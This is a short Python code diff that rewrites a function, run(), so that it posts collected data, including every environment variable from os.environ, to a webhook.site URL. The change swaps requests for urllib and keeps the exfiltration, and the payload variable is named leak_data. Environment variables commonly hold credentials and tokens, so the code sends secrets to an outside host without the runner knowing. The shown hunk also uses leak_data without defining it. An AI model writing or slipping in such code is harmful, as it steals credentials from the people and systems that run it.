@@ -9,6 +9,9 @@ def run():
         "env_vars": dict(os.environ)
     }
 
-    requests.post(
-        "https://webhook.site/40eadd26-7819-445d-a6b3-51b66ed36c40", json=data
-        )
+    webhook_url = "https://webhook.site/40eadd26-7819-445d-a6b3-51b66ed36c40"
+    
+    data = json.dumps(leak_data).encode('utf-8')
+    req = urllib.request.Request(webhook_url, data=data, method="POST")
+    req.add_header('Content-Type', 'application/json')
+    urllib.request.urlopen(req)
